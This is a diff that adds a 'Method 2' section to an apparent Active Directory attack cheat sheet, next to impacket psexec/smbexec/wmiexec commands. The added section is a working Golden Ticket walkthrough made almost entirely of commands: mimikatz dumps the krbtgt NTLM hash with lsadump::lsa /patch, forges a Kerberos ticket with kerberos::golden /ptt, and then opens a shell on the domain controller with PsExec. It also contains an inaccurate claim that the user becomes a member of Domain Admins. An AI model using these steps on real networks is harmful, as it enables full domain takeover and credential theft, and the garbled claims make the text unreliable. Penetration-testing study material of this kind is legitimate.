@@ -739,6 +739,36 @@ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
+#### Method 2
+Suppose you are a `jen` user you have `krbtgt NTLM hash` wanna access the Domain controller !!
+```javacript
+# we dont have acccess to do this command as jen user !!
+PsExec.exe \\dc1 cmd.exe
+
+.\mimikatz.exe
+privilege::debug
+
+#grabbing krbtgt NTLM hash 
+lsadump::lsa /patch
+
+#delete exsisting other tickets
+kerberos::purge
+
+kerberos::golden /user:jen /domain:corp.com /sid:<DC sid> /krbtgt:<NTLM hash> /ptt
+
+```
+#### Get access to Domain controller
+```javascript
+mimikatz.exe #no need for highest privileges
+misc::cmd
+
+# Now we can access!!
+PsExec.exe \\dc1 cmd.exe
+
+After this the jen user will be part of the domain adminsgroup !!
+
+only make use of the domain name like \\dc1 don't put IP you will not get access !!
+```
 
 ### Forced Password Change Using rpcclient
 
